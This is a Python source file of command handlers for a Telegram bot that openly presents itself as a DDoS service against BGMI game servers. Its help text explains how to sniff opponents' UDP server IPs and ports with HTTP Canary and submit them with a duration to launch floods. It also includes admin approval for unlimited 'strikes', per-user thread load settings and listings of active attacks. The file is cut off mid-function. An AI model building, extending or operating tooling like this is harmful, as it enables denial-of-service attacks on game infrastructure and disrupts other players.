"""
Command handlers for the BGMI Warrior Bot by IBR.
Implements all the bot commands and message handlers.
"""
import asyncio
import logging
import random
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Union, Any, Callable
from localization.messages import get_available_languages, get_message
import ipaddress
import pytz
import telebot
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from telebot.async_telebot import AsyncTeleBot
from telebot.types import (
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery
)

from action_service import ActionService
from config import BotConfig
from database import Database
from models import UserAction, UserProfile, UserMode, UserStatus
from utils import format_time_remaining, get_random_duration, create_user_markup

logger = logging.getLogger('bgmi_warrior_bot.handlers')


class CommandHandlers:
    """Telegram bot command handlers"""
    
    def __init__(self, bot: AsyncTeleBot, db: Database, 
                action_service: ActionService, config: BotConfig, 
                scheduler: AsyncIOScheduler):
        """Initialize command handlers"""
        self.bot = bot
        self.db = db
        self.action_service = action_service
        self.config = config
        self.scheduler = scheduler
        self.timezone = pytz.timezone(config.TIMEZONE)
        self.start_time = datetime.now(pytz.utc)
        self.temp_data = {}
        
        # Register handlers
        self._register_handlers()
    
    def _register_handlers(self):
        """Register all message handlers"""
        # Command handlers
        self.bot.register_message_handler(self.handle_start, commands=['start'])
        self.bot.register_message_handler(self.handle_help, commands=['help'])
        self.bot.register_message_handler(self.handle_ping, commands=['ping'])
        self.bot.register_message_handler(self.handle_auth, commands=['auth'])
        self.bot.register_message_handler(self.handle_history, commands=['history'])
        self.bot.register_message_handler(self.handle_stats, commands=['stats'])
        self.bot.register_message_handler(self.handle_usage, commands=['usage'])
        self.bot.register_message_handler(self.handle_setthread, commands=['setthread'])
        self.bot.register_message_handler(self.handle_approve, commands=['approve'])
        self.bot.register_message_handler(self.handle_reject, commands=['reject'])
        self.bot.register_message_handler(self.handle_remove, commands=['remove'])
        self.bot.register_message_handler(self.handle_yell, commands=['yell'])
        self.bot.register_message_handler(self.handle_list_active, commands=['list_active'])
        self.bot.register_message_handler(self.handle_language, commands=['language', 'lang'])
        
        # Mode selection handler
        self.bot.register_message_handler(
            self.handle_mode_selection,
            func=lambda message: message.text in ['Manual Mode', 'Auto Mode'])
        
        # Stop all handler
        self.bot.register_message_handler(
            self.handle_stop_all,
            func=lambda message: message.text and message.text.lower() == 'stop all')
        
        # Callback query handler
        self.bot.register_callback_query_handler(
            self.handle_callback_query,
            func=lambda call: True)
        
        # Generic message handler (must be last)
        self.bot.register_message_handler(self.handle_message, func=lambda message: True)
    
    async def _is_user_authorized(self, user_id: int) -> bool:
        """Check if user is authorized"""
        if user_id in self.config.AUTHORIZED_USERS:
            return True
            
        user = await self.db.get_user_profile(user_id)
        return user and user.is_authorized(self.timezone)
    
    async def handle_start(self, message: Message):
        """Handle /start command"""
        user_id = message.from_user.id
        username = message.from_user.username or "Unknown"
        
        # Create or update user profile
        user = await self.db.get_user_profile(user_id) or UserProfile(
            user_id=user_id,
            username=username,
            first_name=message.from_user.first_name,
            last_name=message.from_user.last_name
        )
        await self.db.save_user_profile(user)
        
        # Log activity
        await self.db.log_activity(user_id, "start", {"chat_id": message.chat.id})
        
        # Create keyboard markup
        markup = ReplyKeyboardMarkup(one_time_keyboard=False, resize_keyboard=True)
        markup.add(KeyboardButton('Manual Mode'), KeyboardButton('Auto Mode'))
        markup.add(KeyboardButton('/help'), KeyboardButton('/usage'))
        
        welcome_text = (
            "🎮 *Yo, BGMI Warrior! Welcome to the DDoS Drop Zone!* 🎮\n\n"
            "🔥 *Gear up!* I'm your squad leader for smashing servers in BGMI!\n\n"
            "💣 *Battle Plan:*\n"
            "1️⃣ *Manual Mode:* You snipe—IP, port, duration, BOOM!\n"
            "2️⃣ *Auto Mode:* Drop IP and port, I'll frag with a random timer!\n\n"
            "✋ *Chicken Dinner Brake:* `stop all` to pull out!\n\n"
            "🔒 *Squad Rules:* Private needs `/auth`. Groups? 5 strikes/day unless you're a warlord!\n\n"
            "📡 *Intel:* `/help` for the full loot drop!\n\n"
            "*Built by Ibr, the BGMI Beast!*"
        )
        
        await self.bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)
    
    # Add this new method to the CommandHandlers class:
    async def handle_language(self, message: Message):
        """Handle /language command - Change user language preference"""
        user_id = message.from_user.id
    
         # Get arguments from command
        args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    
    # Get available languages
        available_languages = get_available_languages()
    
    # If a language code is provided, try to set it
        if args and args[0] in available_languages:
            lang_code = args[0]
         
        # Get user profile
            user = await self.db.get_user_profile(user_id) or UserProfile(user_id=user_id)
        
        # Update language preference
            user.language = lang_code
            await self.db.save_user_profile(user)
        
        # Get language name for response
            lang_name = available_languages[lang_code]
        
        # Send confirmation message in the selected language
            from localization.messages import get_message
            response = get_message("language_changed", lang_code, language=lang_name)
        
            await self.bot.reply_to(message, response, parse_mode='Markdown')
        
        # Log activity
            await self.db.log_activity(
            user_id, 
            "change_language", 
            {"new_language": lang_code}
            )
        
        else:
        # If no valid language code, show available options
            language_list = "\n".join([f"• `{code}` - {name}" for code, name in available_languages.items()])
            response = (
            "🌐 *Language Selection* 🌐\n\n"
            f"Current languages available:\n{language_list}\n\n"
            "To change your language, use:\n"
            "`/language [code]`\n\n"
            "Example: `/language hi` for Hindi"
            )
        
            await self.bot.reply_to(message, response, parse_mode='Markdown')

    async def handle_help(self, message: Message):
        """Handle /help command"""
        user_id = message.from_user.id
        await self.db.log_activity(user_id, "help", {"chat_id": message.chat.id})
        
        help_text = (
            "📡 *BGMI DDoS Bootcamp* 📡\n\n"
            "💥 *Snipe IPs & Ports with HTTP Canary for BGMI Domination!* 💥\n\n"
            "🎯 *Warzone Intel:* 🎯\n"
            "1️⃣ *Gear Up:* Grab *HTTP Canary* from Play Store—your scope! 📲\n"
            "2️⃣ *Lock On:* Hit *Start* (▶️) to scan the battlefield! 🌐\n"
            "3️⃣ *Drop In:* Launch BGMI, hit the lobby, wait for the timer! 🎮\n"
            "4️⃣ *Spot Enemies:* Flip to Canary, lock onto *UDP* packets! 📡\n"
            "5️⃣ *Target Locked:* Find ports *10,000-30,000* (e.g., `12345`). IP like `203.0.113.5`—grab it! ✂️\n"
            "6️⃣ *Strike Hard:*\n"
            "   - *Manual:* `<IP> <Port> <Duration>` (e.g., `203.0.113.5 14567 60`)\n"
            "   - *Auto:* `<IP> <Port>` (e.g., `203.0.113.5 14567`)\n\n"
            "🔫 *Hot Drops:*\n"
            "   - Manual: `203.0.113.5 14567 60`\n"
            "   - Auto: `203.0.113.5 14567`\n\n"
            "⚠️ *No-Fly Zones:*\n"
            f"   - Blocked ports: `{', '.join(str(p) for p in self.config.BLOCKED_PORTS)}`—dodge 'em! 🚫\n"
            "   - Private? `/auth` for warlord status. Groups? 5/day unless elite!\n\n"
            "💪 *Need Backup?* I've got your six—just holler!\n\n"
            "*Forged by Ibr, the BGMI War Machine!*"
        )
        
        await self.bot.reply_to(message, help_text, parse_mode='Markdown')
    
    async def handle_ping(self, message: Message):
        """Handle /ping command"""
        user_id = message.from_user.id
        await self.db.log_activity(user_id, "ping", {"chat_id": message.chat.id})
        
        now = datetime.now(pytz.utc)
        uptime = str(now - self.start_time).split('.')[0]
        
        # Get active process count
        active_count = len(self.action_service.active_processes)
        
        ping_text = (
            f"🎯 *Ping!* Locked and loaded!\n"
            f"⏰ *Uptime:* `{uptime}`\n"
            f"🔥 *Active Strikes:* `{active_count}`\n"
            "💪 *Status:* Ready to deploy!"
        )
        
        await self.bot.reply_to(message, ping_text, parse_mode='Markdown')
    
    async def handle_auth(self, message: Message):
        """Handle /auth command - Request authorization"""
        user_id = message.from_user.id
        username = message.from_user.username or "Unknown"
        
        # Check if user is already an admin
        if user_id in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "👑 *You're already a BGMI God!* No queue for legends!", 
                parse_mode='Markdown'
            )
            return
        
        # Check if user is already authorized
        user = await self.db.get_user_profile(user_id)
        if user and user.is_authorized(self.timezone):
            expire_time_str = user.expire_time.astimezone(self.timezone).strftime("%Y-%m-%d %H:%M:%S")
            await self.bot.reply_to(
                message, 
                f"🔥 *You're a BGMI Warlord!* 🔥\n\n"
                f"⏰ *War Pass Expires:* `{expire_time_str}` ({self.config.TIMEZONE})\n"
                "Keep owning the battleground!",
                parse_mode='Markdown'
            )
            return
        
        # Create request message
        await self.bot.reply_to(
            message, 
            f"🎮 *Warlord Request Dropped!* Stay frosty!\n\n"
            f"👤 *ID:* `{user_id}`\n"
            f"👑 *Tag:* @{username}\n\n"
            "Admins are scoping—warlord status incoming! 💣",
            parse_mode='Markdown'
        )
        
        # Notify admins
        await self._notify_admins(user_id, username)
        
        # Log activity
        await self.db.log_activity(
            user_id, 
            "auth_request", 
            {"username": username, "chat_id": message.chat.id}
        )
    
    async def _notify_admins(self, user_id: int, username: str):
        """Notify admins about new authorization request"""
        admin_message = (
            f"🎮 *New BGMI Warlord Request!* 🎮\n\n"
            f"👤 *Player:* @{username} (ID: `{user_id}`)\n"
            f"💣 *Mission:* Approve or frag this wannabe!"
        )
        
        # Inline keyboard for quick approval
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("✅ 24h", callback_data=f"approve_{user_id}_24h"),
            InlineKeyboardButton("✅ 7d", callback_data=f"approve_{user_id}_7d"),
            InlineKeyboardButton("✅ 30d", callback_data=f"approve_{user_id}_30d")
        )
        markup.row(
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
        )
        
        # Send to each admin
        for admin_id in self.config.AUTHORIZED_USERS:
            try:
                await self.bot.send_message(
                    admin_id, 
                    admin_message, 
                    parse_mode='Markdown',
                    reply_markup=markup
                )
            except Exception as e:
                logger.error(f"Failed to notify admin {admin_id}: {str(e)}")
    
    async def handle_approve(self, message: Message):
        """Handle /approve command - Approve user authorization"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Check if user is admin and in private chat
        if chat_type != 'private' or user_id not in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "🚫 *Warlord Command Only!* Elite squad approves!", 
                parse_mode='Markdown'
            )
            return
        
        try:
            # Parse command: /approve <user_id> <duration>
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")
                
            target_id = int(parts[1])
            duration_str = parts[2].lower()
            
            # Calculate expiration time
            now = datetime.now(self.timezone)
            expire_time = None
            
            time_match = re.match(r"(\d+)([dhm])", duration_str)
            if time_match:
                value, unit = time_match.groups()
                value = int(value)
                if unit == 'h':
                    expire_time = now + timedelta(hours=value)
                elif unit == 'd':
                    expire_time = now + timedelta(days=value)
                elif unit == 'm':
                    expire_time = now + timedelta(days=30 * value)
            elif duration_str == 'permanent':
                expire_time = now + timedelta(days=365*100)
                
            if not expire_time:
                await self.bot.reply_to(
                    message, 
                    "❌ *Timer Glitch!* Use `Xd`, `Xh`, `Xm`, or `permanent`!", 
                    parse_mode='Markdown'
                )
                return
                
            # Get user info
            target_user = await self.db.get_user_profile(target_id)
            
            # Update user authorization
            success = await self.db.authorize_user(target_id, expire_time)
            
            if success:
                # Notify admin
                await self.bot.reply_to(
                    message, 
                    f"🎉 *{target_id} joins the Warlords for {duration_str}!* Locked and loaded! 💪", 
                    parse_mode='Markdown'
                )
                
                # Notify user
                try:
                    await self.bot.send_message(
                        target_id, 
                        "👑 *You're a BGMI Warlord!* Unlimited strikes—drop 'em all! 🔥", 
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Failed to notify user {target_id}: {str(e)}")
                
                # Log activity
                await self.db.log_activity(
                    user_id, 
                    "approve_user", 
                    {"target_id": target_id, "duration": duration_str}
                )
            else:
                await self.bot.reply_to(
                    message, 
                    "⚠️ *Database Misfire!* Approval failed—try again!", 
                    parse_mode='Markdown'
                )
                
        except ValueError:
            await self.bot.reply_to(
                message, 
                "❌ *Command Fumble!* Drop `/approve <user_id> <duration>`!", 
                parse_mode='Markdown'
            )
    
    async def handle_reject(self, message: Message):
        """Handle /reject command - Reject user authorization"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Check if user is admin and in private chat
        if chat_type != 'private' or user_id not in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "🚫 *Warlord Veto Only!* No squad for you!", 
                parse_mode='Markdown'
            )
            return
            
        try:
            # Parse command: /reject <user_id>
            parts = message.text.split()
            if len(parts) != 2:
                raise ValueError("Invalid format")
                
            target_id = int(parts[1])
            
            # Update user profile
            user = await self.db.get_user_profile(target_id)
            if user:
                user.status = UserStatus.REJECTED
                await self.db.save_user_profile(user)
                
                # Notify admin
                await self.bot.reply_to(
                    message, 
                    f"💥 *{target_id} fragged!* No warlord status!", 
                    parse_mode='Markdown'
                )
                
                # Notify user
                try:
                    await self.bot.send_message(
                        target_id, 
                        "😡 *Warlord Denied!* Admin dropped you—GG no re!", 
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Failed to notify user {target_id}: {str(e)}")
                
                # Log activity
                await self.db.log_activity(
                    user_id, 
                    "reject_user", 
                    {"target_id": target_id}
                )
            else:
                await self.bot.reply_to(
                    message, 
                    f"⚠️ *{target_id} not found!* No user to reject!", 
                    parse_mode='Markdown'
                )
                
        except ValueError:
            await self.bot.reply_to(
                message, 
                "❌ *Target Missed!* Use `/reject <user_id>`—aim better!", 
                parse_mode='Markdown'
            )
    
    async def handle_remove(self, message: Message):
        """Handle /remove command - Remove user authorization"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Check if user is admin and in private chat
        if chat_type != 'private' or user_id not in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "🚫 *Warlord Kick Only!* Elite boots only!", 
                parse_mode='Markdown'
            )
            return
            
        try:
            # Parse command: /remove <user_id>
            parts = message.text.split()
            if len(parts) != 2:
                raise ValueError("Invalid format")
                
            target_id = int(parts[1])
            
            # Get user profile
            user = await self.db.get_user_profile(target_id)
            if user and user.status == UserStatus.AUTHORIZED:
                # Update user status
                user.status = UserStatus.REGULAR
                user.expire_time = None
                success = await self.db.save_user_profile(user)
                
                if success:
                    # Notify admin
                    await self.bot.reply_to(
                        message, 
                        f"✅ *{target_id} kicked from Warlords!* Out of the squad!", 
                        parse_mode='Markdown'
                    )
                    
                    # Notify user
                    try:
                        await self.bot.send_message(
                            target_id, 
                            "💥 *Warlord Status Revoked!* Admin sniped you!", 
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Failed to notify user {target_id}: {str(e)}")
                    
                    # Log activity
                    await self.db.log_activity(
                        user_id, 
                        "remove_user", 
                        {"target_id": target_id}
                    )
                else:
                    await self.bot.reply_to(
                        message, 
                        "⚠️ *Database Misfire!* Removal failed—try again!", 
                        parse_mode='Markdown'
                    )
            else:
                await self.bot.reply_to(
                    message, 
                    f"⚠️ *{target_id} ain't elite!* No one to drop!", 
                    parse_mode='Markdown'
                )
                
        except ValueError:
            await self.bot.reply_to(
                message, 
                "❌ *Kick Fail!* Use `/remove <user_id>`—lock on!", 
                parse_mode='Markdown'
            )
    
    async def handle_history(self, message: Message):
        """Handle /history command - Show user action history"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Check authorization for private chats
        if chat_type == 'private':
            user = await self.db.get_user_profile(user_id)
            is_authorized = user_id in self.config.AUTHORIZED_USERS or (user and user.is_authorized(self.timezone))
            
            if not is_authorized:
                await self.bot.reply_to(
                    message, 
                    "🚫 *Warlord Pass Needed!* Drop `/auth` to unlock!", 
                    parse_mode='Markdown'
                )
                return
        
        # Get user history
        actions = await self.db.get_user_actions(user_id, 5)
        
        if not actions:
            await self.bot.reply_to(
                message, 
                "🌌 *No Kills Yet!* Time to frag!", 
                parse_mode='Markdown'
            )
            return
        
        # Format history message
        response = "📜 *Your BGMI Kill Log!* 📜\n\n"
        for action in actions:
            ts = action.timestamp.astimezone(self.timezone).strftime("%Y-%m-%d %H:%M:%S")
            response += f"🌍 *IP:* `{action.ip}` | 🔌 *Port:* `{action.port}` | ⏳ `{action.duration}s` | *Mode:* `{action.mode}` | ⏰ `{ts}`\n\n"
        
        # Log activity
        await self.db.log_activity(user_id, "history", {"chat_id": message.chat.id})
        
        await self.bot.reply_to(message, response, parse_mode='Markdown')
    
    async def handle_stats(self, message: Message):
        """Handle /stats command - Show system statistics"""
        user_id = message.from_user.id
        
        # Check if user is admin
        if user_id not in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "🚫 *Squad Leaders Only!* Warlords get the intel!", 
                parse_mode='Markdown'
            )
            return
        
        # Get statistics from database
        stats = await self.db.get_statistics()
        
        # Get current active processes count
        active_count = len(self.action_service.active_processes)
        
        # Format stats message
        now = datetime.now(self.timezone)
        stats_message = (
            f"📊 *BGMI Warzone Report* 📊\n\n"
            f"⏰ *Sitrep:* `{now.strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"👑 *Warlords:* `{stats['authorized_users']}`\n"
            f"👤 *Total Users:* `{stats['total_users']}`\n"
            f"💥 *Live Strikes:* `{active_count}`\n"
            f"🔫 *Today's Kills:* `{stats['today_actions']}`\n"
            f"🎯 *All-Time Kills:* `{stats['total_actions']}`\n\n"
        )
        
        # Add daily actions chart if available
        if stats['daily_actions']:
            stats_message += "*📈 7-Day Kill Count:*\n"
            for date, count in stats['daily_actions'].items():
                stats_message += f"`{date}`: `{count}` strikes\n"
        
        stats_message += "\n*Command the battleground!*"
        
        # Log activity
        await self.db.log_activity(user_id, "stats", {"chat_id": message.chat.id})
        
        await self.bot.reply_to(message, stats_message, parse_mode='Markdown')
    
    async def handle_usage(self, message: Message):
        """Handle /usage command - Show user usage statistics"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Check authorization for private chats
        if chat_type == 'private':
            user = await self.db.get_user_profile(user_id)
            is_authorized = user_id in self.config.AUTHORIZED_USERS or (user and user.is_authorized(self.timezone))
            
            if not is_authorized:
                await self.bot.reply_to(
                    message, 
                    "🚫 *Warlord Pass Required!* Drop `/auth` to squad up!", 
                    parse_mode='Markdown'
                )
                return
                
            # Warlords have unlimited usage
            if is_authorized:
                await self.bot.reply_to(
                    message, 
                    "🔥 *Unlimited BGMI Chaos!* Warlords like you don't reload! 💪", 
                    parse_mode='Markdown'
                )
                return
        
        # Authorized users and private chats have unlimited usage
        if user_id in self.config.AUTHORIZED_USERS or (chat_type == 'private' and await self._is_user_authorized(user_id)):
            await self.bot.reply_to(
                message, 
                "🔥 *Unlimited BGMI Chaos!* Warlords like you don't reload! 💪", 
                parse_mode='Markdown'
            )
            return
        
        # Get user's daily usage count
        today_count = await self.db.get_today_action_count(user_id)
        remaining = max(0, self.config.RATE_LIMIT - today_count)
        
        # Format usage message
        usage_message = (
            f"📊 *Group Strike Report!* 📊\n\n"
            f"🔫 *Fired:* `{today_count}/{self.config.RATE_LIMIT}`\n"
            f"💣 *Ammo Left:* `{remaining}`\n\n"
            f"⏰ *Reloads:* Midnight ({self.config.TIMEZONE})\n"
            "🎯 *Go Warlord:* `/auth` in private for endless frags!"
        )
        
        # Log activity
        await self.db.log_activity(user_id, "usage", {"chat_id": message.chat.id})
        
        await self.bot.reply_to(message, usage_message, parse_mode='Markdown')
    
    async def handle_setthread(self, message: Message):
        """Handle /setthread command - Set thread value for actions"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Check authorization for private chats
        if chat_type == 'private':
            is_authorized = user_id in self.config.AUTHORIZED_USERS or await self._is_user_authorized(user_id)
            
            if not is_authorized:
                await self.bot.reply_to(
                    message, 
                    "🚫 *Warlord Access Only!* Get elite with `/auth`!", 
                    parse_mode='Markdown'
                )
                return
        
        try:
            # Get user profile
            user = await self.db.get_user_profile(user_id) or UserProfile(user_id=user_id)
            
            # Parse command: /setthread <value>
            parts = message.text.split()
            if len(parts) == 2:
                # Set new thread value
                thread_value = int(parts[1])
                if thread_value < 50 or thread_value > 500:
                    await self.bot.reply_to(
                        message,
                        "⚠️ *Thread Load Invalid!* Use value between 50-500!",
                        parse_mode='Markdown'
                    )
                    return
                    
                user.thread_value = thread_value
                await self.db.save_user_profile(user)
                
                await self.bot.reply_to(
                    message, 
                    f"🎮 *Thread Locked at {thread_value}!* Your weapon's primed! 💥", 
                    parse_mode='Markdown'
                )
                
                # Log activity
                await self.db.log_activity(
                    user_id, 
                    "set_thread", 
                    {"thread_value": thread_value}
                )
            else:
                # Display current thread value
                thread_value = user.thread_value or 200
                
                await self.bot.reply_to(
                    message, 
                    f"🔫 *Current Thread Load:* `{thread_value}`\n\n"
                    "🎮 *Reload:* `/setthread <value>`—lock and load!",
                    parse_mode='Markdown'
                )
                
        except ValueError:
            await self.bot.reply_to(
                message, 
                "❌ *Value Error!* Enter a number between 50-500!",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Error in handle_setthread: {str(e)}")
            
            user = await self.db.get_user_profile(user_id)
            thread_value = user.thread_value if user else 200
            
            await self.bot.reply_to(
                message, 
                f"🔫 *Current Thread Load:* `{thread_value}`\n\n"
                "🎮 *Reload:* `/setthread <value>`—drop in!",
                parse_mode='Markdown'
            )
    
    async def handle_yell(self, message: Message):
        """Handle /yell command - Broadcast message to all users"""
        user_id = message.from_user.id
        
        # Check if user is admin
        if user_id not in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "🚫 *Warlord Mic Only!* Grunts don't shout!",
                parse_mode="Markdown"
            )
            return
        
        # Extract broadcast message
        broadcast_message = message.text.replace("/yell", "").strip()
        if not broadcast_message:
            await self.bot.reply_to(
                message, 
                "❌ *Mic Jam!* Drop some war cries first!",
                parse_mode="Markdown"
            )
            return
        
        # Show confirmation keyboard
        keyboard = InlineKeyboardMarkup()
        confirm_button = InlineKeyboardButton(
            "📢 Drop the Bomb!", 
            callback_data=f"confirm_broadcast_{message.chat.id}"
        )
        keyboard.add(confirm_button)
        
        # Save broadcast message for later use
        self.temp_data[f"broadcast_{message.chat.id}"] = broadcast_message
        
        # Create timeout for temp data
        self.scheduler.add_job(
            self._remove_temp_data,
            'date',
            run_date=datetime.now(pytz.utc) + timedelta(minutes=30),
            args=[f"broadcast_{message.chat.id}"],
            id=f"remove_broadcast_{message.chat.id}"
        )
        
        # Log activity
        await self.db.log_activity(
            user_id, 
            "yell_preview", 
            {"message": broadcast_message}
        )
        
        await self.bot.reply_to(
            message, 
            f"🎤 *Squad Alert Preview:*\n\n`{broadcast_message}`\n\nReady to hype the battleground?",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    
    def _remove_temp_data(self, key: str):
        """Remove temporary data after timeout"""
        if key in self.temp_data:
            del self.temp_data[key]
            logger.info(f"Removed temporary data for key: {key}")
    
    async def handle_list_active(self, message: Message):
        """Handle /list_active command - List active users"""
        user_id = message.from_user.id
        
        # Check if user is admin
        if user_id not in self.config.AUTHORIZED_USERS:
            await self.bot.reply_to(
                message, 
                "🚫 *Warlord Access Only!* No intel for grunts!",
                parse_mode='Markdown'
            )
            return
        
        # Get active processes
        active_processes = self.action_service.active_processes
        if not active_processes:
            await self.bot.reply_to(
                message, 
                "🌌 *Dead Zone!* No squads in action!",
                parse_mode='Markdown'
            )
            return
        
        # Format active users list
        active_list = "🔥 *Active BGMI Warriors:* 🔥\n\n"
        for uid, info in active_processes.items():
            # Try to get username
            try:
                user = await self.db.get_user_profile(uid)
                username = user.username if user else "Unknown"
            except:
                username = "Unknown"
            
            ip = info.get('ip', 'Unknown')
            port = info.get('port', 'Unknown')
            duration = info.get('duration', 'Unknown')
            elapsed = (datetime.now(pytz.utc) - info.get('start_time', datetime.now(pytz.utc))).total_seconds()
            remaining = max(0, duration - elapsed) if isinstance(duration, (int, float)) else 'Unknown'
            
            active_list += (
                f"👤 *Player:* {username} (ID: `{uid}`)\n"
                f"🎯 *Target:* `{ip}:{port}`\n"
                f"⏳ *Remaining:* `{int(remaining)}s`\n\n"
            )
        
        # Log activity
        await self.db.log_activity(user_id, "list_active", {"count": len(active_processes)})
        
        await self.bot.reply_to(message, active_list, parse_mode='Markdown')
    
    async def handle_mode_selection(self, message: Message):
        """Handle mode selection message"""
        user_id = message.from_user.id
        selected_mode = message.text.lower().split()[0]
        mode = UserMode.MANUAL if selected_mode == 'manual' else UserMode.AUTO
        
        # Update user profile
        user = await self.db.get_user_profile(user_id) or UserProfile(user_id=user_id)
        user.preferred_mode = mode
        await self.db.save_user_profile(user)
        
        # Log activity
        await self.db.log_activity(
            user_id, 
            "mode_selection", 
            {"mode": mode}
        )
        
        await self.bot.reply_to(
            message, 
            f"🎮 *Switched to {selected_mode.capitalize()} Mode!* Time to frag! 💣",
            parse_mode='Markdown'
        )
    
    async def handle_stop_all(self, message: Message):
        """Handle 'stop all' command - Stop all active processes for user"""
        user_id = message.from_user.id
        
        # Attempt to stop user's actions
        result, msg = await self.action_service.stop_action(user_id)
        
        if result:
            await self.bot.reply_to(
                message, 
                "🛑 *Strike Aborted!* Squad's safe!",
                parse_mode='Markdown'
            )
        else:
            await self.bot.reply_to(
                message, 
                "⚠️ *No Strikes to Abort!* Zone's clear!",
                parse_mode='Markdown'
            )
        
        # Log activity
        await self.db.log_activity(
            user_id,
            "stop_all",
            {"result": result, "message": msg}
        )
    
    async def handle_callback_query(self, call: CallbackQuery):
        """Handle callback queries from inline keyboards"""
        user_id = call.from_user.id
        data = call.data
        
        # Handle approve/reject callbacks
        if data.startswith("approve_"):
            await self._handle_approve_callback(call)
        elif data.startswith("reject_"):
            await self._handle_reject_callback(call)
        elif data.startswith("confirm_broadcast_"):
            await self._handle_broadcast_callback(call)
        else:
            await self.bot.answer_callback_query(call.id, "Unknown action")
    
    async def _handle_approve_callback(self, call: CallbackQuery):
        """Handle approve callback"""
        data = call.data
        admin_id = call.from_user.id
        
        # Validate admin
        if admin_id not in self.config.AUTHORIZED_USERS:
            await self.bot.answer_callback_query(
                call.id, 
                "Only admins can approve users!"
            )
            return
        
        try:
            # Parse data: approve_<user_id>_<duration>
            parts = data.split('_')
            if len(parts) != 3:
                raise ValueError("Invalid format")
                
            target_id = int(parts[1])
            duration_str = parts[2]
            
            # Calculate expiration time
            now = datetime.now(self.timezone)
            expire_time = None
            
            if duration_str == '24h':
                expire_time = now + timedelta(hours=24)
                display_duration = "24 hours"
            elif duration_str == '7d':
                expire_time = now + timedelta(days=7)
                display_duration = "7 days"
            elif duration_str == '30d':
                expire_time = now + timedelta(days=30)
                display_duration = "30 days"
            else:
                await self.bot.answer_callback_query(
                    call.id, 
                    "Invalid duration!"
                )
                return
                
            # Update user authorization
            success = await self.db.authorize_user(target_id, expire_time)
            
            if success:
                # Update inline keyboard to show approved status
                new_markup = InlineKeyboardMarkup()
                new_markup.add(InlineKeyboardButton(
                    f"✅ Approved for {display_duration}", 
                    callback_data="approved"
                ))
                
                await self.bot.edit_message_reply_markup(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=new_markup
                )
                
                # Notify admin
                await self.bot.answer_callback_query(
                    call.id, 
                    f"User {target_id} approved as Warlord for {display_duration}!"
                )
                
                # Notify user
                try:
                    await self.bot.send_message(
                        target_id, 
                        "👑 *You're a BGMI Warlord!* Unlimited strikes—drop 'em all! 🔥", 
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Failed to notify user {target_id}: {str(e)}")
                
                # Log activity
                await self.db.log_activity(
                    admin_id, 
                    "callback_approve_user", 
                    {"target_id": target_id, "duration": duration_str}
                )
            else:
                await self.bot.answer_callback_query(
                    call.id, 
                    "Failed to approve user! Try again or use /approve command."
                )
                
        except Exception as e:
            logger.error(f"Error in approve callback: {str(e)}")
            await self.bot.answer_callback_query(
                call.id, 
                "An error occurred! Try using the /approve command manually."
            )
    
    async def _handle_reject_callback(self, call: CallbackQuery):
        """Handle reject callback"""
        data = call.data
        admin_id = call.from_user.id
        
        # Validate admin
        if admin_id not in self.config.AUTHORIZED_USERS:
            await self.bot.answer_callback_query(
                call.id, 
                "Only admins can reject users!"
            )
            return
        
        try:
            # Parse data: reject_<user_id>
            parts = data.split('_')
            if len(parts) != 2:
                raise ValueError("Invalid format")
                
            target_id = int(parts[1])
            
            # Get user profile
            user = await self.db.get_user_profile(target_id)
            if user:
                # Update user status
                user.status = UserStatus.REJECTED
                success = await self.db.save_user_profile(user)
                
                if success:
                    # Update inline keyboard
                    new_markup = InlineKeyboardMarkup()
                    new_markup.add(InlineKeyboardButton(
                        "❌ Rejected", 
                        callback_data="rejected"
                    ))
                    
                    await self.bot.edit_message_reply_markup(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        reply_markup=new_markup
                    )
                    
                    # Notify admin
                    await self.bot.answer_callback_query(
                        call.id, 
                        f"User {target_id} rejected!"
                    )
                    
                    # Notify user
                    try:
                        await self.bot.send_message(
                            target_id, 
                            "😡 *Warlord Denied!* Admin dropped you—GG no re!", 
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Failed to notify user {target_id}: {str(e)}")
                    
                    # Log activity
                    await self.db.log_activity(
                        admin_id, 
                        "callback_reject_user", 
                        {"target_id": target_id}
                    )
                else:
                    await self.bot.answer_callback_query(
                        call.id, 
                        "Failed to reject user! Try again or use /reject command."
                    )
            else:
                await self.bot.answer_callback_query(
                    call.id, 
                    f"User {target_id} not found!"
                )
                    
        except Exception as e:
            logger.error(f"Error in reject callback: {str(e)}")
            await self.bot.answer_callback_query(
                call.id, 
                "An error occurred! Try using the /reject command manually."
            )
    
    async def _handle_broadcast_callback(self, call: CallbackQuery):
        """Handle broadcast confirmation callback"""
        data = call.data
        admin_id = call.from_user.id
        
        # Validate admin
        if admin_id not in self.config.AUTHORIZED_USERS:
            await self.bot.answer_callback_query(
